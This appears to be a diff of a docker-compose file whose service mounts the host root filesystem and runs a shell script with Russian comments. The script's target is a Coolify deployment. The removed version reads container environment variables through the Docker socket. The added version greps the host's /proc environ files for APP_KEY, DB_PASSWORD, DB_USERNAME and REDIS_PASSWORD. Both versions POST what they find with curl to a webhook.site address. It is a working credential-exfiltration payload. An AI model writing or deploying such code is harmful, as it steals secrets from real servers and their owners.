@@ -6,34 +6,24 @@ services:
     network_mode: host
     volumes:
       - '/:/host-root'
-      - '/var/run/docker.sock:/var/run/docker.sock'
     command:
       - sh
       - -c
       - |
-        apk add --no-cache curl jq
+        apk add --no-cache curl
         
-        # 1. Получаем список всех контейнеров и находим ID coolify
-        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json > /tmp/containers.json
+        # 1. Найти PID контейнера coolify через /proc
+        # Контейнер coolify - это процесс на хосте
+        find /host-root/proc -maxdepth 2 -name environ -exec grep -l "APP_KEY" {} \; 2>/dev/null | head -1 > /tmp/coolify_environ_path.txt
         
-        # 2. Извлекаем ID контейнера coolify (не sentinel, не proxy, не db)
-        COOLIFY_ID=$(cat /tmp/containers.json | jq -r '.[] | select(.Names[] | contains("coolify") and (contains("sentinel") or contains("proxy") or contains("db") or contains("redis") or contains("realtime") or contains("rce-test") | not)) | .Id' | head -1)
+        cat /tmp/coolify_environ_path.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=environ_path
         
-        echo "Coolify ID: $COOLIFY_ID" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_id
-        
-        # 3. Получаем переменные окружения по ID
-        curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$COOLIFY_ID/json" > /tmp/coolify_env.json
-        
-        ls -la /tmp/coolify_env.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_json_size
-        
-        # 4. Извлекаем APP_KEY и DB_PASSWORD
-        cat /tmp/coolify_env.json | jq -r '.Config.Env[] | select(startswith("APP_KEY=") or startswith("DB_PASSWORD=") or startswith("DB_USERNAME=") or startswith("REDIS_PASSWORD="))' > /tmp/secrets.txt
-        
-        cat /tmp/secrets.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_secrets
-        
-        # 5. Отладка: если ничего не нашли
-        if [ ! -s /tmp/secrets.txt ]; then
-          head -c 3000 /tmp/coolify_env.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=debug_json
+        # 2. Прочитать переменные окружения
+        ENVIRON_PATH=$(cat /tmp/coolify_environ_path.txt)
+        if [ -n "$ENVIRON_PATH" ]; then
+          cat "$ENVIRON_PATH" | tr '\0' '\n' | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_secrets
+        else
+          echo "Coolify environ not found" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=no_environ
         fi
         
         sleep 3600
